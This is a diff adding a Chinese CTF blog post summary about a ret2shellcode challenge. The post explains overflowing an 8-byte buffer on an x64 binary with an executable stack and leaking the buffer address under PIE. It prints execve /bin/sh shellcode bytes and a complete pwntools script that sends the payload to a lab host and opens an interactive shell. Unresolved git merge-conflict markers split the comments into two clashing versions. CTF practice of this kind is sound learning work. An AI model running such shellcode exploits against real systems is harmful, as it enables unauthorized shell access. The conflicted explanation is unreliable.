@@ -158,6 +158,25 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
+    <h2>ret2shellcode
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>首先查看基本情况：
+ida中也没有看到system和/bin/sh
+可以看到栈可执行，我们需要判断是jmp rsp还是输入shellcode：
+在IDA中我们可以看到read函数可以输入0x40个字符，但buf却只存取8个字符，所以我们有0x38个字符可以输入，这个长度我们可以使用shellcode
+shellcode = &#39;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#39; 又因为程序开启了PIE，我们需要计算shellcode的地址：
+p.recvuntil(&#39;[&#39;) buf_addr = p.recvuntil(&#39;]&#39;,drop=True) 这样就可以计算出存放字符的起始地址
+然后构造payload：
+payload = flat([&#39;a&#39;*16,p64(int(buf_addr,16)&#43;8&#43;8&#43;8),shellcode])//‘a’*16：填充字符&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD//p64(int(buf_addr,16)&#43;8&#43;8&#43;8)：buf_addr的起始地址&#43;read函数读取的8位&#43;rbp的填充&#43;shellcode的8位地址=======//p64(int(buf_addr,16)&#43;8&#43;8&#43;8)：buf_addr的起始地址&#43;read函数读取的8位&#43;leave使用掉的8位&#43;shellcode的8位地址//leave = mov esp,ebp;pop ebp&gt;&gt;&gt;&gt;&gt;&gt;&gt; origin/dev #ret2shellcode_x64from pwn import *#p = process(&#34;./ret2shellcode&#34;)p = remote(&#34;10.0.25.109&#34;,10000)shellcode = &#39;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#39;p.recvuntil(&#39;:&#39;)buf_addr = p.recvuntil(&#39;\n&#39;,drop=True)payload = flat([&#39;a&#39;*16,p64(int(buf_addr,16)&#43;8&#43;8&#43;8),shellcode])p.sendline(payload)p.interactive() </p>
+  </div>
+  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to ret2shellcode" href="https://jellyfish-pro.github.io/ctf/ret2shellcode/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
     <h2>ret2syscall
     </h2>
   </header>
